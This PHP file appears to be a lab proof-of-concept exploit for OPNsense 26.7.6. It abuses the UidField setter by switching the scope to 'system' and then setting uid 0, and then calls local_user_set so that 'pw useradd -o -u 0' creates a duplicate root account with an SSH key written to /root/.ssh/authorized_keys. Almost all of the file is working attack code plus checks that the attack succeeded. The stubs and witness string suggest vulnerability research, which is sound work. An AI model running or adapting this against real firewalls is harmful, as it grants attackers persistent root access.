<?php

/**
 * OPNsense 26.7.6 UidField gadget: two-step scope=system then uid=0, then
 * local_user_set -> pw useradd -o -u 0. Calls the pin UidField::setValue.
 */

declare(strict_types=1);

const WITNESS = "OPNSENSE-UIDFIELD-SYSTEM-UID0-WITNESS";
const PIN_SHA = "a842fe48c21288d11a422cb944678e8eb308becf";
const PIN_TAG = "26.7.6";
const KEYS_PATH = "/root/.ssh/authorized_keys";
const ORACLE_PATH = "/oracle/secret";
const PW_ARGV_LOG = "/tmp/pw-argv.log";

error_reporting(E_ALL);
ini_set("display_errors", "0");
ini_set("log_errors", "1");

if (!function_exists("gettext")) {
    function gettext(string $message): string
    {
        return $message;
    }
}

if (!defined("LOG_ERR")) {
    define("LOG_ERR", 3);
}

$labRoot = __DIR__;
$pinUid = $labRoot . "/pin/src/opnsense/mvc/app/models/OPNsense/Auth/FieldTypes/UidField.php";
$pinAuth = $labRoot . "/pin/src/etc/inc/auth.inc";

require $labRoot . "/stubs/IntegerField.php";
require $pinUid;

/**
 * @return array<string, mixed>
 */
function emit_and_exit(array $row, int $code = 0): never
{
    echo json_encode($row, JSON_UNESCAPED_SLASHES) . "\n";
    exit($code);
}

function auth_log(string $message, int $prio = LOG_ERR): void
{
    error_log("auth_log[{$prio}]: {$message}");
}

function userIsAdmin(string $username): bool
{
    unset($username);
    return false;
}

function exec_safe(mixed $format, mixed $args = []): string
{
    if (!is_array($format)) {
        $format = [$format];
    }
    if (!is_array($args)) {
        $args = [$args];
    }
    return (string)preg_replace_callback(
        "/%./",
        static function (array $matches) use (&$args): string {
            if ($matches[0] === "%%") {
                return "%";
            }
            if ($matches[0] !== "%s") {
                throw new TypeError("exec_safe(): Unsupported formatter");
            }
            if ($args === []) {
                throw new TypeError("exec_safe(): Missing arguments");
            }
            return escapeshellarg((string)array_shift($args));
        },
        implode(" ", $format)
    );
}

function mwexecfm(mixed $format, mixed $args = []): int
{
    $command = exec_safe($format, $args);
    $output = [];
    $code = 0;
    exec($command . " 2>&1", $output, $code);
    return $code;
}

require $pinAuth;

final class LabScope
{
    public function __construct(public string $value)
    {
    }

    public function isEqual(string $test): bool
    {
        return $this->value === $test;
    }
}

final class LabParentNode
{
    public function __construct(public LabScope $scope)
    {
    }
}

final class LabUidHolder
{
    public function __construct(private int $uid)
    {
    }

    public function asInt(): int
    {
        return $this->uid;
    }
}

final class LabUserRow
{
    public function __construct(public object $uid)
    {
    }
}

final class LabUserList
{
    /** @var list<LabUserRow> */
    public array $items = [];

    public function iterateItems(): Generator
    {
        foreach ($this->items as $item) {
            yield $item;
        }
    }
}

final class LabUserModel
{
    public function __construct(public LabUserList $user)
    {
    }
}

/**
 * @return array{field: \OPNsense\Auth\FieldTypes\UidField, scope: LabScope}
 */
function make_uid_field(string $scope): array
{
    $scopeNode = new LabScope($scope);
    $parentNode = new LabParentNode($scopeNode);
    $users = new LabUserList();
    $users->items[] = new LabUserRow(new LabUidHolder(0));
    $users->items[] = new LabUserRow(new LabUidHolder(80));
    $model = new LabUserModel($users);

    $field = new OPNsense\Auth\FieldTypes\UidField();
    $field->labBind($model, $parentNode);
    $users->items[] = new LabUserRow($field);

    return ["field" => $field, "scope" => $scopeNode];
}

function read_file_if_any(string $path): string
{
    if (!is_file($path)) {
        return "";
    }
    $data = file_get_contents($path);
    return $data === false ? "" : $data;
}

$ref = new ReflectionMethod(OPNsense\Auth\FieldTypes\UidField::class, "setValue");
$loadedFile = (string)$ref->getFileName();
$loadedSrc = read_file_if_any($loadedFile);
$realPin = realpath($pinUid) ?: $pinUid;
$loadedReal = realpath($loadedFile) ?: $loadedFile;

if ($loadedReal !== $realPin) {
    emit_and_exit([
        "ok" => false,
        "error" => "uidfield-not-pin",
        "loaded" => $loadedFile,
        "pin" => $pinUid,
    ], 1);
}

$pinBranch = str_contains($loadedSrc, 'if (!$this->isSet() || !$in_scope)')
    && str_contains($loadedSrc, "parent::setValue(\$value)");
if (!$pinBranch) {
    emit_and_exit([
        "ok" => false,
        "error" => "uidfield-branch-missing",
        "loaded" => $loadedFile,
    ], 1);
}

$two = make_uid_field("user");
$two["field"]->applyDefault();
$twoStepAfterAdd = $two["field"]->asInt();
$two["scope"]->value = "system";
$two["field"]->setValue("0");
$twoStepAfterSet = $two["field"]->asInt();

$neg = make_uid_field("user");
$neg["field"]->applyDefault();
$negAfterAdd = $neg["field"]->asInt();
$neg["field"]->setValue("0");
$negAfterSet = $neg["field"]->asInt();

@unlink(ORACLE_PATH);
@unlink(KEYS_PATH);
@unlink(PW_ARGV_LOG);
if (!is_dir("/oracle")) {
    mkdir("/oracle", 0755, true);
}
if (!is_dir("/root/.ssh")) {
    mkdir("/root/.ssh", 0700, true);
}

$user = [
    "name" => "labuid0",
    "uid" => $two["field"]->asInt(),
    "password" => "*",
    "descr" => "lab uid0",
    "authorizedkeys" => base64_encode(WITNESS . "\n"),
];
local_user_set($user);

$oracle = read_file_if_any(ORACLE_PATH);
$keys = read_file_if_any(KEYS_PATH);
$pwArgv = read_file_if_any(PW_ARGV_LOG);
$pwHit = str_contains($pwArgv, "useradd")
    && str_contains($pwArgv, "-o")
    && (str_contains($pwArgv, "-u 0") || str_contains($pwArgv, "-u0"));

emit_and_exit([
    "ok" => true,
    "pin" => [
        "tag" => PIN_TAG,
        "sha" => PIN_SHA,
        "file" => $loadedFile,
        "php" => PHP_VERSION,
        "class" => $ref->getDeclaringClass()->getName(),
        "branch" => $pinBranch,
    ],
    "two_step_after_add" => $twoStepAfterAdd,
    "two_step_after_set" => $twoStepAfterSet,
    "user_scope_after_add" => $negAfterAdd,
    "user_scope_after_set" => $negAfterSet,
    "user_uid" => $user["uid"],
    "pw_argv" => $pwArgv,
    "pw_hit" => $pwHit,
    "oracle" => trim($oracle),
    "keys" => trim($keys),
    "keys_path" => KEYS_PATH,
    "witness" => WITNESS,
]);
